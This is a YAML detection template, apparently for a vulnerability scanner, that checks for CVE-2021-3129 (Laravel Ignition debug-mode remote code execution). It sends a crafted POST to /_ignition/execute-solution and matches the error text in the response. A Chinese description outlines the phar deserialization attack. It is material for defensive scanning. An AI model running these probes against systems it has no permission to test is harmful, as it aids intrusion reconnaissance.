id: CVE-2021-3129

info:
    name: LARAVEL <= V8.4.2 DEBUG MODE - REMOTE CODE EXECUTION
    author: Jarcis-cy(https://github.com/Jarcis-cy)
    severity: critical
    description: |
      在 Debug 模式下，Laravel 内置的 Ignition 功能某些接口未严格过滤输入数据，导致 file_get_contents() 和 file_put_contents() 函数使用不安全，从而使攻击者能够使用恶意日志文件引起 phar 反序列化攻击，远程执行代码并最终获得服务器权限。
    reference:
      - https://www.anquanke.com/post/id/231459

set:
  r: randomLowercase(12)
rules:
  r0:
    request:
      method: POST
      path: /_ignition/execute-solution
      headers:
        Content-Type: application/json
      body: |-
        {
                "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
                "parameters": {
                  "variableName": "username",
                  "viewFile": "{{r}}"
                }
        }
      follow_redirects: true
    expression: >
      response.status == 500 && response.body.bcontains(bytes("file_get_contents(" + string(r) + ")")) && response.body.bcontains(bytes("failed to open stream"))
expression: r0()

